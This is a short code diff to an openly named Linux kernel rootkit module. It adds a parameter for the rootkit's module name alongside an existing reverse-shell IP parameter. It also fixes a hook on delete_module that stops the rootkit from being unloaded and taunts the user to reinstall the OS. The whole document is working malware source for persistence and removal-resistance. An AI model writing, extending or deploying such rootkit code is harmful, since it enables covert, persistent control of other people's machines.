@@ -57,6 +57,9 @@ struct commands cmds;
  * intermittently and do things when it changes.
  **/
 
+static char *module_name = NULL;
+module_param(module_name, charp, 0770);
+MODULE_PARM_DESC(module_name, "Name of rootkit module.");
 static char *rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, 0770);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
@@ -159,7 +162,7 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
 
 KHOOK(delete_module);
 static long khook_delete_module(const char __user *name_user, unsigned int flags) {
-    if (!strncpy(module_name, name_user)) {
+    if (!strncmp(module_name, name_user, strlen(module_name))) {
         printk(KERN_INFO "This sounds like a good time to reinstall your OS.");
         return -ENOENT;
     }
